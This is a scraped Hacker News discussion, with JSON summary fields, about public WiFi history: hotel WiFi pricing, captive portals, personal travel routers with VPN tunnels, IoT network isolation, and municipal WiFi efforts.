reason.replymcculley 23 minutes ago | root | parent | next [–] Wi-Fi and Internet access in general killed off an enormous revenue source for hotels: pay-per-view porn. They were very motivated to find new ways to get that revenue back.replymyself248 1 hour ago | root | parent | prev | next [–] Anecdotally having been on the road at the time, there didn't seem to be a correlation between price and whether they had it or not.And often the 1½-star motel would just have a single AP in the office serving the whole horseshoe of rooms directly, while the big fancy hotel would need several APs per floor which made it a vastly more expensive and complicated deployment. If the cheap one was acting weird, the desk clerk could just power cycle it and most issues were resolved moments after one phone call. But everybody at the big hotels was afraid to touch it (probably had been instructed not to), and resolving problems took hours or days.replynine_k 8 hours ago | root | parent | prev | next [–] Not strangely; it's completely logical. By the same token, a bottle of sparkling water would cost you much more in an expensive restaurant. Those who live in upscale hotels and eat at expensive restaurants are usually much less price-sensitive.replycpeterso 8 hours ago | root | parent | prev | next [–] Price discrimination: people staying at expensive hotels can afford to pay for Wi-Fi or they're on a business trip and will just expense the cost.replybenbristow 4 hours ago | root | parent | prev | next [–] In the UK it's the other way round.Our big two 'budget' (haha) hotel chains, Premier Inn and Travelodge both charge for barely usable Wi-Fi. The former offering an unlimited free service but restricted to about 500kbps and a paid 'ultimate' service which runs at about 10mbps. The latter giving you 30 mins free and then you have to pay, unless you're in one of their premium rooms where its included. Total racket supplied by Virgin WiFi for both. Thankfully don't often need it with better 4G/5G signal but sometimes the rooms can be Faraday cages.Most of the more posh hotels I've been to have free unlimited decent WiFi.replychrismcb 4 hours ago | root | parent | prev | next [–] It was a business thing. Business travelers works get there company to pay for the WiFi. So it was expensive. And it wasn't a US thing. I ran into the same issue in Europe.replyalbert_e 8 hours ago | root | parent | prev | next [–] this is probably because bigger hotels are more likely to be booked by business travellers and these expenses get lumped into reimbursements.smaller hotels need to compete for more discerning budget oriented travellers who will only pay charges seen as reasonable, or start avoiding hotels seen as fleecing.replyant6n 7 hours ago | root | parent | next [–] As a business Traveller for bigcorp, I wouldn‘t really know how to expense such an item, it seems at least a big hassle. We book hotels through our system, travel too, food is on a fixed budget. Taxi receipts I can include with the travel reimbursement form. Other stuff is a hassle.I think of there wasn’t free wifi, Id just tether of the phone.replyowenmarshall 1 hour ago | root | parent | next [–] Huh, that’s surprising - when I traveled for bigcorps and littlecorps “internet access” always had its own category in whatever process we had, be it Concur or someone’s hand rolled Excel sheet.I haven’t travelled in years, but just checked my current software and it’s still there today.replyjtokoph 8 hours ago | parent | prev | next [–] I remember it as the quality and speed of the connection being inversely proportional. You would get 50mb/s for free at a cheap motel, but pay $25/day for \"Business Class\" wifi that might hit 768kb/s at the Ritz Carlton at off peak hours.replybombcar 2 hours ago | root | parent | next [–] The cheap motel would have a connection and a cheap Wi-Fi router, and you’d get the whole bandwidth (even today sometimes I find a fat nearly gigabit pipe in the middle of nowhere).The expensive larger hotel would have a fancy barely working system from Cisco that monitored and limited bandwidth. Sometime, however, there would be an Ethernet Jack under the table that would give you full 100mb/s.reply2143 8 hours ago | parent | prev | next [–] Did you mean you say directly/inversely \"proportioned\" rather than \"correlated\"?(English is not my first language).replycolonwqbang 6 hours ago | root | parent | next [–] No, it's correct as written. \"Proportional\" is a very strong statement. It means that one variable is a linear function of another, i.e. y = kx. \"The power dissipated in a wire is proportional to the current through the wire\".\"Correlation\" can mean almost any kind of relationship where a change in one variable follows a change in another. \"Smoking is correlated with lung cancer\".replymananaysiempre 4 hours ago | root | parent | next [–] And \"proportioned\" (as opposed to \"proportional\") is not about a mathematical relationship at all, but about the proportions of somebody or something, as in the shape: a perfectly-proportioned body, a badly-proportioned room, a generously-proportioned seat; an accompanying adverb is usually (always?) required.replypests 8 hours ago | prev | next [–] Is the blog author on here?I discovered this site a few weeks ago and then spent days reading every post. I found the electronic asset tagging article very interesting and now notice every sensor tower at stores. The one about alarm wiring was also very interesting.replynocoiner 8 hours ago | parent | next [–] I love this writer. Terrific writer and excellent sense of obscure yet fascinating topics. My only complaint is that the posts don’t seem to timely appear in my RSS reader - not sure I’ve ever seen a new post show up in my feed despite being subscribed.replyjcrawfordor 8 hours ago | root | parent | next [–] I'll check on the RSS. It's not very well generated and I've had issues with some clients not liking it before.replynocoiner 8 hours ago | root | parent | next [–] I hope it was clear that no criticism was intended toward you. I take some (well, all) responsibility for lashing my content consumption to an early 2000s technology and all the corresponding drawbacks.replyEamonnMR 2 hours ago | root | parent | prev | next [–] For what it's worth, I found this post via my RSS reader.replyjmholla 8 hours ago | parent | prev | next [–] Which article is that? Sounds interesting but my rudimentary search of the archive turned up nothing.replypests 6 hours ago | root | parent | next [–] The electronic asset article (part 1 of 2) is athttps://computer.rip/2022-07-21-preventing-loss-dot-jpeg.htm...(love the title)The alarm one should be be obviously named.replyemmelaich 1 hour ago | prev | next [–] Roofnet (to be Meraki, bought by Cisco) started provided free municipal wifi in conjunction with some municipalities around 2010 or so.There were others too; not sure why exactly it didn't work out though I can guess.https://en.wikipedia.org/wiki/Roofnethttps://web.archive.org/web/20080725163614/http://pdos.csail...replymyself248 1 hour ago | parent | next [–] Huh, that sounds strikingly similar to Ricochet's geographic routing protocol.replypluijzer 4 hours ago | prev | next [–] Reminds me of the time when mobile data was still expensive and I did not have it. If I needed to chat with somebody and I was not home I would sit in the street waiting to get a few seconds of WiFi from busses would drive past. Worked quite well for sending and receiving messages.replybombcar 2 hours ago | parent | next [–] I’ve sat outside a McDonald’s in the mottle of nowhere to connect to Wi-Fi more times than I’d like to admit.Travelling in Europe by car I had Here maps downloaded to the phone, because it could tell me where McDonald’s were, and they always had a restroom and Wi-Fi.replyblfr 6 hours ago | prev | next [–] it seems that it has actually become less common for cafes to offer WiFi againIn touristy places wifi is usually available in cafes and there's a correlation between the quality of coffee and the quality of the Internet connection. Best tonic espresso I had in Barcelona was in the divine rays of 300 Mbit wifi6.https://goo.gl/maps/15nse3xEXAhAppQw6The correlation holds surprisingly well but allowances need to be made for \"no laptops\" places and Italy.replybombcar 2 hours ago | parent | next [–] International “free Wi-Fi” is often gated behind some confusing tracking/login pages that are only available in the local language.Luckily playing the polite dumb tourist often is enough to get someone to enter the “real” Wi-Fi password for the non guest network.Or sometimes there’s a login via Facebook button you can recognize via logos.replythelastparadise 2 hours ago | parent | prev | next [–] > divine rays of 300 Mbit wifi6Are we sure that basking in the divine WiFi rays isn't giving us cancer?replysyntaxing 2 hours ago | root | parent | next [–] https://www.cdc.gov/nceh/radiation/nonionizing_radiation.htm...replyBrendinooo 2 hours ago | prev | next [–] A bit of an aside, but one of the biggest perks of having Comcast as my ISP (I don't love this, but it's the only wired choice I have at my house) is that for roughly 60 percent of my public computing, I connect to an \"xfinitywifi\" router and get good-enough service.Dunno what kind of tracking and security risks I'm exposing myself to though...replynunez 1 hour ago | parent | next [–] Xfinity now allows non-Xfinity customers to pay $20/mo for this amazing perk. On one hand, xfinitywifi is fucking everywhere, which makes this immensely useful. On the other hand, it runs off of spare bandwidth from customer gateways...replybombcar 2 hours ago | parent | prev | next [–] Everything important goes over https so at worst you’re leaking some DNS, which probably isn’t a major issue.If you VPN over the top, you leak even less.replythelastparadise 2 hours ago | root | parent | next [–] > If you VPN over the top, you leak even less.You leak just as well, but now you're leaking to the sketchy VPN provider.replywintermutestwin 1 hour ago | root | parent | next [–] Hard to be more sketchy than a company that successfully lobbied your government to allow them to steal user data from their captive customers.replyceejayoz 1 hour ago | root | parent | prev | next [–] So run one at home or on an EC2 instance somewhere.replybombcar 44 minutes ago | root | parent | next [–] If you just want to prevent providers eyeballing you, this can work well.If you really want complete anonyminitiy you have to layer stuff, and consider something like Mullvad or another VPN that lets you pay in untraceable funds.replyRyanShook 10 hours ago | prev | next [–] Kind of sad how ad-hoc mode was such a a failure. I always imagined how cool it would be to have a huge number of devices all connected to the internet through each other but it was hard enough to just get two devices talking.replycallalex 10 hours ago | parent | next [–] It’s important to note that the WiFi ad-hoc standard is not a mesh network standard, and was never intended to be one. It is just a simplified standard for an Access Point with an easier to implement feature set.replyuserbinator 9 hours ago | root | parent | next [–] It's been a while since I've looked at this in detail but I believe ad-hoc mode essentially gives you the equivalent of a wireless Ethernet hub.replybenterix 1 hour ago | parent | prev | next [–] It was a \"failure\" in the sense no significant mesh network was ever created because it was against the interest of service providers.Today we have vastly superior possibilities and yet, apart from some niche efforts like the LoRaWAN, a \"free mesh\" is still not a thing.replyBrajeshwar 11 hours ago | prev | next [–] These days, would you use any public WiFi? Even on extended travel, I carry a portable router that plugs into the hotel/stay router/port and then use my own Wi-Fi. Yes, I do have VPN/DNS filter/protection etc on the Phone but you have \"too many devices\" that will pick that up and every one of them will try to connect to that WiFi. Easier to take care of a Laptop but it becomes a hassle/irritant.For India, Internet over the phone is so cheap (and OK quality) that most people don't care about WiFi outside of their home/office.Would love to know more how you deal with these situations?replylmm 10 hours ago | parent | next [–] > These days, would you use any public WiFi?These days I treat my home network the same as a public network. Too many \"smart\" devices to be worth trusting, so the devices I care about are locked down the same as they would be if I connected them directly to the internet - and sometimes I do. Frankly I have more trust that I can keep my phone or laptop up to date than any consumer-grade router (do you know which version of linux it's running? How often do you even get updates?)replypclmulqdq 10 hours ago | root | parent | next [–] Putting IoT devices on your guest network is a very common home security/privacy thing to do. They very often snoop when they can, and your router shuts that down on the guest network.replyCaligatio 9 hours ago | root | parent | next [–] Beyond mDNS \"snooping\", has there been reporting of non-compromised IoT inappropriately listening on networks?To be clear, I agree that putting IoT devices on a separate VLAN is a good idea but I do that because they're black boxes, not because they're malicious.replygberger 7 hours ago | root | parent | prev | next [–] If they're on the guest network, how do you control them? Over Bluetooth?replymananaysiempre 4 hours ago | root | parent | next [–] There are two categories of devices worth considering:- Those controllable (only) through the manufacturer's server and requiring an Internet connection: put them on the guest network that only has a (NATed) route to the Internet and nothing else (ideally, of course, don't buy them);- Those controllable over LAN and not requiring an Internet connection: put them on a jail network that has a route to the main network and is firewalled away from the Internet (and perhaps from initiating connections to the main network as well).replyGauntletWizard 9 hours ago | root | parent | prev | next [–] I want my router to allow my IOT devices to send out mDNS beacons, and for other devices to connect to them, but otherwise they're restricted and logged.This is an order of magnitude more complex than I trust a home router to do, though...replybdavbdav 4 hours ago | root | parent | next [–] Even on my UniFi gear its still a bit of a faff every time a manufacturer does it slightly differently (and still raises my suspicions when controlling google home devices doesn't work / not receiving mDNS broadcasts etc).replybdavbdav 4 hours ago | root | parent | prev | next [–] Absolutely - Never trust the wire, whatever wire it is.replydelta_p_delta_x 10 hours ago | parent | prev | next [–] Where I live, most of the mass rapid transit stations are underground, and connection is sometimes spotty. The country has launched a secure public Wi-Fi service. Users on smartphones can authenticate using EAP-SIM[1], or laptop users can use an app developed by the agency to authenticate with WPA2 Enterprise PEAP MSCHAPv2.[1]: https://en.wikipedia.org/wiki/Extensible_Authentication_Prot...replyxobs 8 hours ago | root | parent | next [–] The implementation here is rather annoying, because as soon as you enter the tunnel the wifi cuts off. But there's a 10-15 second latency where network connections just fail as the phone decides the AP is actually gone before it cuts over to LTE.Then the whole process repeats again once you get to the next station.Since LTE is usually reliable even in the tunnel, I usually remove the wifi connection. Granted it might help that I don't normally travel during peak hour, so the mobile network is usually fine for my needs.It's made even more annoying by the fact that \"Forgetting\" the connection only works until the phone is rebooted, at which point the behaviour returns.replyTheHappyOddish 5 hours ago | root | parent | next [–] > It's made even more annoying by the fact that \"Forgetting\" the connection only works until the phone is rebooted, at which point the behaviour returns.That seems odd. My phone doesn't connect to a network unless it's toggled to auto join, and certainly not post \"forget\". Can you not control this?replytoast0 3 hours ago | root | parent | next [–] I'm not familiar with the networks in question, but I've run into a couple wifi networks connected to my lte carrier, and my unlocked phone pushes them hard. I imagine there's something coming from the SIM, and I could see the OS picking up SIM affiliated wifi networks on boot or sim insertion. Unless special care were taken, it makes sense that forgetting a network isn't remembered.replyFnoord 2 hours ago | parent | prev | next [–] Yes, I would. I use Wireguard client with kill switch. If I don't have a Wireguard connection, nothing works. The only caveat is the Wireguard server runs on my home connection. If down, 'my internet is down'. If slow, 'my internet is slow'. But actually it appears to be pretty reliable. Another downside is all the traffic is tunneled through my home IPv4 and I might not want other people to know such. But that too seems to be an edge case. Against a possibly hostile or hacked WLAN network which I decide to use, it works fine, though I generally use it over mobile (which I've configured to only use LTE / 5G NR, not lower as these are easier to MITM and I don't want a downgrade attack although in theory in such a case, too, Wireguard client w/killswitch would protect).replynine_k 9 hours ago | parent | prev | next [–] Yes, I pretty often use WiFi in airports overseas, because roaming data rates are not fun (or data does not work), and whatever slice of free access the airport WiFi allows is usually enough to check mail and connecting flights, chat a bit over IM, upload a few photos, sometimes even review a PR or push a PR.Hotel WiFi is usually so-so, even paid, but still much better than 10 years ago.replymidasuni 8 hours ago | root | parent | next [–] I get free international roaming nowadays, but 5 years ago I was in China and accidentally plugged my phone in to my laptop to charge.Laptop started syncing something that had been blocked all week (Dropbox maybe), and the SMS flooded in.The connection was so fast that within a minute or two I got the following message:From Vodafone: So far you've used 83MB of data today in our Rest of World Zone, and spent £255. It'll cost £15 for each additional 5MB you use. We'll next let you know when you've spent £495 today but, if you'd prefer us not to, please contact your account administrator. Sent OCT 15 @10:45 UKreplygumby 8 hours ago | root | parent | prev | next [–] In India you need a local phone number just to use wifi. I think this is a lawreplyNavinF 8 hours ago | root | parent | next [–] Why not use an Indian VoIP number or eSIM?replynine_k 7 hours ago | root | parent | next [–] Can it be obtained remotely, before you arrive and show your papers?replymulmen 8 hours ago | parent | prev | next [–] The network is compromised. Any other assumption is lunacy. This is why we have TLS. Plugging your own WiFi into a hostile network (read: any) does precisely fuckall to improve your security.replyahoka 4 hours ago | root | parent | next [–] You can filter out broadcast, multicast and other kind of link local nastyness. Also a single tunnel obscures traffic if one’s super secretive.replyceejayoz 11 hours ago | parent | prev | next [–] I’ve never had issues with four phones and two laptops on Hilton wifi when we travel as a family.replyDistractionRect 11 hours ago | parent | prev | next [–] I do something similar, with a router flashed with openwrt. If there's a physical router/ethernet port I can plug into great, if not I run one of the radios in client mode to connect to the wifi.All traffic is secured with wireguard to my home router, and then goes through my ISP. The wireguard tunnel is wrapped in an error correcting tunnel; it makes a huge difference on the usability a lot of public APs.replyHelmut10001 10 hours ago | root | parent | next [–] I think these setups are fantastic. Here [1] I wrote about my IPSEC-setup on a portable private Wifi network based on a Protectli that I connected to someone's Wifi.[1]: https://du.nkel.dev/blog/2021-11-19_pfsense_opnsense_ipsec_c...replybane 10 hours ago | root | parent | prev | next [–] Out of curiosity how do you deal with situations where the public wifi has one of those middle pages that you have to type in or click something (captive portal?) before the access point grants access?replyDistractionRect 10 hours ago | root | parent | next [–] Dnsmasq has a neat feature where you can populate ipsets/nftsets with responses to dns queries. So I have it populate a set with the IPs for sites like neverssl.com, and use a firewall rule to route requests to destinations in the set through wan without sending it through the VPN. Usually works.replygumby 8 hours ago | root | parent | prev | next [–] One way is to change the MAC address of your laptop to that of the router, authenticate, and then connect the router (and change your laptop back)replymuppetman 10 hours ago | root | parent | prev | next [–] Edit: I apologise I see you have answered this below.What is your error correcting tunnel? Given that Wireguard is UDP and that any tunneled TCP that gets dropped should just be handled by TCP, why encapsulate Wireguard in something else? I certainly find Wireguard itself improves many Public Wifi networks, I've never thought to encapsulate it further.replyDistractionRect 9 hours ago | root | parent | next [–] > any tunneled TCP that gets dropped should just be handled by TCP, why encapsulate Wireguard in something else?That's the thing, TCP doesn't really handle lossy connections well. A moderate lossy link might do udp traffic like video fine, but be practically unusable for TCP traffic.replyretrobox 10 hours ago | root | parent | prev | next [–] Can you share more details on the setup of the error correcting tunnel? That sounds very interesting!replyDistractionRect 10 hours ago | root | parent | next [–] It's been a while since I set it up, but iirc I ended up going with https://github.com/wangyu-/UDPspeederPretty sure I used the suggested config and it's been working flawlessly in the background.Or something like that. With wireguard, it's just a matter of pointing the config at the local socket for the fec tunnel (or any other type of tunnel, there was a dicussion about making it look like TCP http traffic the other day), so it's pretty much plug and play.replynunez 1 hour ago | parent | prev | next [–] Yes but I use Tailscale and route through my exit nodereplygumby 8 hours ago | parent | prev | next [–] This is the way. Also good for those hotels/conference centers that give you a small number of “allowable” devices — when you have kids with multiple devices, maybe a game console, etc plus maybe an appletv you quickly run out. Instead the router authenticates and that’s that.I terminate my VPN at one of my own machines mainly for (marginal) security but conveniently this lets me stream the same stuff as home since the services can’t tell the exit is a VPNreplybaumschubser 6 hours ago | prev | next [–] There was a time (end 2000's?) when multiple popular home wifi router models calculated their default wifi password from their MAC addresses. There where websites doing the calculation for you, if you gave them the router's MAC.For me, this was the transitory technology between those laughable free (or sometimes even paid) wifis that where just broken and the time when a) hotels etc. had their wifi finally fixed and b) one could resort to cell phone internet.replyzokier 7 hours ago | prev | next [–] It's funny how I remember that era, but from outsider perspective. Public WiFi was far less impactful thing around me because we had good 3G deployment pretty early on. Some highlights from that era for me were netbooks (remember those?) with builtin wwan, and having multi-SIM subscription so that I could have USB modem, netbook, and phone all connected with single subscription.replycharles_f 10 hours ago | prev | next [–] > the 802.11 protocol that underlies WiFi is surprisingly complex and offers various different modesYes, but, see: Bluetoothreply1letterunixname 10 hours ago | prev | next [–] Reminds me of:1. Google's Public WiFi in Mountain View, CA: never worked. It was a misconfigured mesh network, possibly with a slow backhaul.2. If you were a starving student, you could get onto the supermarket's slow free WiFi across the street with a long-range, high power 802.11b/g/a card w/ an external directional antenna that looks suspicious on its own.3. When you were slightly less starving but still \"hungry\", the main places with fast WiFi were Starbucks with \"Google WiFI\".replyalbert_e 8 hours ago | prev | next [–] > attributed to the Better Business Bureau, noted information security expertsis this a humorous reference that I didn't get? BBB?replytetris11 6 hours ago | parent | next [–] They're a non-profit for consumer protection, well meaning with the knowledge they have:https://en.wikipedia.org/wiki/Better_Business_Bureaureplyalbert_e 3 hours ago | root | parent | next [–] Hmm. But are they really \"noted information security experts\" though?I would have thought information security would be incidental and only one of the hundreds of aspects of business that they might look at when safeguarding consumers transacting with businesses of all kinds -- many of which (say plumbing or construction or bakeries) may hardly have infosec at the forefront. There are far more prevalent poor business practices, of the routine type - say deficient services or false advertisements, that I believe go to BBB's attention.I never came across BBB being quoted/cited in infosec and IT contexts -- it may be just my ignorance -- happy to be educated.replyalibrarydweller 2 hours ago | root | parent | next [–] I think this was wry humor.replyQuinnyPig 10 hours ago | prev | next [–] To pick a nit, “World of Hyatt” launched in 2017.replywhydoineedthis 10 hours ago | prev [–] Go to Vietnam and every business, even the teeny-tiny mom-and-pop restaurants run out of a street facing living room, will offer free wifi. It was truly an amazing experience being able to expect wifi everywhere I went.And yes, they had passwords and offered secure wifi. You just had to ask for the the password if they didn't already have it displayed somehow. Working remotely, it was glorious.It put into perspective how much the US's focus on individualization removes the warm feeling of camaraderie.Edit: I love when I get downvoted with no comment replies. Real gutsy dispute there.replyTheDong 10 hours ago | parent | next [–] The article mentions that sort of \"free wifi\" (free as in \"free with the purchase of a coffee or food\"), but seems to be much more about things like Municipal Wifi (Free wifi for anyone in the city), and ad-hoc wifi.I also miss the period where it seemed like we might get actual city-wide free-wifi meshes in major metropolitan areas, but alas, it is not to be. Cafe wifi does not replace public utilities.> It put into perspective how much the US's focus on individualization removes the warm feeling of camaraderie.Sorry, what? Large US cities, like SF, basically every cafe has wifi too.A for-profit business offering wifi doesn't exactly give me a feeling of camaraderie, rather the opposite. Offering wifi is a way to ensure people talk to each other even less.I assume you're getting downvoted because you're relaying a personal anecdote that isn't all that relevant, and also frankly just comes off as an excuse to make a dig at the US that doesn't really make sense (\"Did you know cafes have wifi in vietnam? Doesn't america individualism suck?\").replyBrajeshwar 10 hours ago | root | parent | next [–] Pune, a city in India, experimented with a city-wide WiFi[1] in 2007. I think it didn't work out.I've heard that in the remote hills/villages of India, there are WiFi routers deployed to connect the people there where phone/cell reception is bad or not available. These WiFi services helps with commerce, especially UPI[2] Payments.1. https://brajeshwar.com/2007/pune-indias-first-wi-fi-city/2. https://en.wikipedia.org/wiki/Unified_Payments_Interfacereplyproconlon 9 hours ago | parent | prev | next [–] Vietnam has a far more self centered culture than the US. The motorbikes and cars will never ever stop for a pedestrian and drivers can and will split lanes and cut people off. People would rather force their way into a crowded elevator than let people off first. Maybe it's just wifi that gives you warm feelings, which I get, but I must be missing the camaraderie.replyxarope 8 hours ago | root | parent | next [–] I think you have the wrong idea about how pedestrians cross streets in vietnam. You cross, maintain a straight line and a constant speed, and the vehicles play frogger around you.Not the other way round.(only slightly joking here...)replyExoristos 8 hours ago | parent | prev | next [–] It sounds like the American city I live in. Oh, we also have free municipal WiFi.replygumby 8 hours ago | parent | prev | next [–] In Germany our neighbor had some network problems (FU Deutsche Telekom) so we just let her use ours, which I believe is illegal.replynebalee 41 minutes ago | root | parent | next [–] It's not illegal, but you are liable for any wrongdoing done by people using your connection (Störerhaftung), especially with regard to unauthorized filesharing. There was an amendment to the respective law to alleviate this problem and relieve providers of any liability, but the amendment was not phrased clear enough and there's a conflicting ruling from the European Court of Justice. In effect, if you are sued by rightholders for copyright violations committed through your connection, german courts decided, you are still liable unless you identify the perpetrator.replyMaKey 5 hours ago | root | parent | prev | next [–] In Germany it's not illegal to let someone else use your WiFi.replygumby 26 minutes ago | root | parent | next [–] nebalee reminded me what I half-remembered (I no longer live there) which was that the subscriber has liability for the use of the connection.replyAyesh 8 hours ago | parent | prev [–] If they didn't have the password visible, \"66668888\" or \"88888888\" usually works.I truly miss Vietnam.reply",
    "originSummary": [
      "The article discusses the phenomenon of \"Free Public WiFi\" that was popular in the mid-2000s.",
      "It explains the complexities of WiFi protocols and emphasizes the advantages of Windows' built-in wireless configuration utility.",
      "The author also examines the inclusion of proprietary software utilities by PC vendors and the impact of Microsoft's WiFi configuration API.",
      "The article delves into the behavior of Wireless Zero network connections and how the \"Free Public WiFi\" issue was eventually resolved.",
      "It analyzes the prevalence of this network from 2006 to 2018 and raises awareness about potential security risks.",
      "The article concludes by providing the author's contact information."
    ],
    "commentSummary": [
      "The discussion thread covers various topics related to WiFi, such as availability, quality, pricing, and security.",
      "Upscale hotels are often criticized for high costs and poor user experiences with WiFi.",
      "Personal routers are recommended for increasing security while using public WiFi.",
      "Strategies for maintaining security and privacy while using WiFi are discussed.",
      "The thread provides diverse perspectives on WiFi experiences and technologies.",
      "In Germany, individuals can be held liable for copyright violations committed through their internet connection unless they can identify the perpetrator.",
      "However, it is not illegal in Germany to share your WiFi with someone else."
    ],
    "points": 273,
    "commentCount": 120,
    "retryCount": 0,
    "time": 1690763443
  }
]
